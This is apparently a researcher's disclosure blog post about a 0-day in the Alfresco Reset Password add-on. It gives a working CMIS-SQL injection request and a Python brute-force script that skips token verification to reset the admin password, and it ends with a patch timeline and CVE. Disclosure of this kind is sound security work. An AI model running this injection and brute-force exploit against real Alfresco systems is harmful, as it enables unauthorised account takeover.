---
title: "Alfresco Reset Password Add-on - 0day Vulnerabilities"
date: 2020-09-17T06:01:23+01:00
draft: false
index: true
tags: ["bypass", "authentication", "cmis-sql", "0-day"]
categories: ["web", "security"]
comments: true
highlight: true
---

This post is as much about the penetration testing process and the 0-day approach as it is about the vulnerability. I discovered a 0-day vulnerability in one of the most used [plugin](https://www.flex-solution.com/page/alfresco-solution/alfresco-reset-password-add-on) for Password Reset on [Alfresco](https://www.alfresco.com/) Content Services framework.

<!--more-->
### TL;DR
I was performing a penetration test recently and really hadn’t found much on the scoped server. So i start by reviewing the application components hoping to find 0-day vulnerabilities, and indeed i found an intrusting third-party component in the application which seems to be vulnerable.

### The 0-day Approach
In order to take the 0-day approach, first thing is to simulate the target environment and the easiest way is by using docker, so i found this nice docker-compose file on github [acs-community-deployment](https://github.com/ALfresco/acs-community-deployment) to deploy the entire Alfresco Content Services (Community Edition) on my lab environment.

### Components discovery

After deploying Alfresco on my lab, I start by comparing the one on the target environment with the one my lab and i quickly figure out that there is no `Create account` and `Forget Password?` buttons by default on my lab !

> The Target Server

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/Vulnerabilities-discovery-Alfresco-Target.png" alt="Alfresco Target Server" class="img-fluid img-thumbnail" width="500" height="600"/>

> The Lab Server

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/Vulnerabilities-discovery-Alfresco-Lab.png" alt="Alfresco Lab Server" class="img-fluid img-thumbnail" width="500" height="600"/>

Next, I start by analyzing the HTTP requests going from my browser to the server when i click on the `Forget Password?` button and i found out that all requests is being sent to `/share/proxy/alfresco-noauth/com/flex-solution/reset-password`.

With a quick google search i figure out that the `Forget Password?` button is being handled by a plugin called [Alfresco Reset Password add-on](https://github.com/FlexSolution/AlfrescoResetPassword)

## Vulnerabilities discovery
### Blind-boolean-based CMIS-SQL Injection 

`Alfresco Reset Password add-on` is using [CMIS-SQL](https://hub.alfresco.com/t5/alfresco-content-services-hub/cmis-query-language/ba-p/289736) to query data from Alfresco, which is `a read-ony` query language for SELECT statement and with limited functions (like, UPPER, LOWER, etc...). 

Moving forward, I discover that the Reset Password is suffering from possible **CMIS-SQL Injection** when adding a single quote `(')` in the `e-mail` address input!

> Request to the Target Server

```http
POST /share/proxy/alfresco-noauth/com/flex-solution/reset-password HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/share/page/
X-Requested-With: application/json
Content-Type: application/json
Content-Length: 61
Connection: close
Cookie: JSESSIONID=C8207D808B749934EA6DACC4A1BF23A1; _alfTest=_alfTest

{
    "userName":"404-NotFound@amriunix.com'"
}
```
> Response from the Target Server

```http
HTTP/1.1 500 Internal Server Error
Date: Thu, 03 Sep 2020 22:19:05 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_auth_kerb/5.4
Strict-Transport-Security: max-age=315536000; includeSubDomains
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Pragma: no-cache
Content-Type: application/json;charset=UTF-8
Content-Length: 467
matched: externe-No-cockie-CAS
Connection: close

{
   "status":{
      "code":500,
      "name":"Internal Error",
      "description":"An error inside the HTTP server which prevented it from fulfilling the request."
   },
   "message":"08040025 Wrapped Exception (with status template): line 1:59 mismatched character '<EOF>' expecting '''",
   "exception":"",
   "callstack":[
      
   ],
   "server":"Community v5.2.0 (r135134-b14) schema 10,005",
   "time":"Sep 4, 2020 12:19:05 AM"
}

```

### Authentication Bypass

>  Alfresco Reset Password add-on's WorkFlow

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/Authentication-Bypass-Flow.png" alt="Authentication Bypass Flow" class="img-fluid img-thumbnail"/>

Following the Workflow of the Reset Password add-on, we can see that in `Step 1` the application will sent a **Reset Link** via email to the user in this format : `http://target.com/share/noauth/changePassWF?userToken=user_test&taskId=activiti$70130&token=45ed2d9f-d654-453b-8c26-f14ad423112f`

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/workflow-step1.png" alt="WorkFlow Step 1" class="img-fluid img-thumbnail" width="500" height="600"/>

If the user click on the link, the application will verify the `(userToken + taskId + token)` which is `Step 2`. If the verification succeed, the application will prompt the user to enter the **New Password**  

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/workflow-step2.png" alt="WorkFlow Step 2" class="img-fluid img-thumbnail" width="500" height="600"/>

Once the user click submit the application will verify the `(userToken + taskId + new-password)` in `Step 3`. If the verification succeed, the application will change the Password!

> Can you Spot the bug in this Workflow ?

We have two bugs in this Workflow: 

- The `taskId` is an **INCREMENT** integer value, which can be easily bruteforced !
- We can **SKIP** the `Step 2` and go directly from Step 1 to Step 3 !

PS: We figure out that the taskId is an INCREMENT value because we comparing the difference between multiple password reset links!

## Exploitation

Combining those `two bugs` and the previous `CMIS-SQL Injection` vulnerability, we can bypass the authentication and change the password for the admin account!

### Step 1 (Optional)
In this step we will create/use an existing account and ask for `Password Reset`.

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/Exploitation-Step1.png" alt="Exploitation Step 1" class="img-fluid img-thumbnail" width="500" height="600"/>

> Password Reset Link

`http://target.com/share/noauth/changePassWF?userToken=user_test&taskId=activiti$70130&token=45ed2d9f-d654-453b-8c26-f14ad423112f`

Once we receive the **Password Reset Link** on the user inbox, the most important part will be the `taskId` value which is `70130`, we will save this value for later use!

PS: This step is not necessary, however it will save us a lot of time when bruteforcing!
### Step 2
In this step we will trigger a Password Reset for the **ADMIN** account, however since we don't have the Admin's email address, we will use the `CMIS-SQL Injection` vulnerability.

> Admin Password Reset

```http
POST /share/proxy/alfresco-noauth/com/flex-solution/reset-password HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/share/page/
X-Requested-With: application/json
Content-Type: application/json
Content-Length: 61
Connection: close
Cookie: JSESSIONID=C8207D808B749934EA6DACC4A1BF23A1; _alfTest=_alfTest

{
    "userName":"404-NotFound@amriunix.com' OR cm:userName like '%admin%"
}
```

Because the email `404-NotFound@amriunix.com` does not exist in the database and we inject `' OR cm:userName like '%admin%` in the **e-mail** input, this will makes the Reset Password add-on send and trigger a password reset event for the `admin` account.

### Step 3
So far, we have successfully:

- **Retrieve** the last `taskId` value.
- **Trigger** a Password Reset event for the `Admin` account.

Now we will run a python script to bruteforce the correct `taskId` value assigned to the `Admin` account.

```python
#!/usr/bin/python3

import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

host = "https://target.com"
victimUser = "admin"
newPassword = "Le1m3in!"
retreivedTaskId = 70130 # Retrieved taskId


header = {
    'Host': 'target.com',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Connection': 'close',
}


for i in range(1000):
    payload = {
        "new-password":newPassword,
        "new-password-confirm":newPassword,
        "taskId":"activiti${}".format(retreivedTaskId + i),
        "userToken":victimUser,
        "save":"undefined"
    }
    r = requests.post(host + '/share/proxy/alfresco-noauth/com/flex-solution/applyChangedPassword', json=payload, headers=header, verify=False)
    if (int(r.status_code) == 200):
        print "Password Changed !"
        print "User Name : {}".format(victimUser)
        print "Task ID : {}".format(retreivedTaskId + i)
        print "Password : {}".format(newPassword)
        break
```

### PWN

<img src="/img/Alfresco-Reset-Password-add-on-0-day-Vulnerabilities/pwn.png" alt="PWN" class="img-fluid img-thumbnail" width="500" height="600"/>

### Timeline

- 01/09/2020: Vulnerability Discovery
- 04/09/2020: Vulnerabilities Report 
- 16/09/2020: Vulnerability Patch and the Vendor release a new version 1.2.0
- 17/09/2020: CVE assigned [CVE-2020-25728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25728)


</br>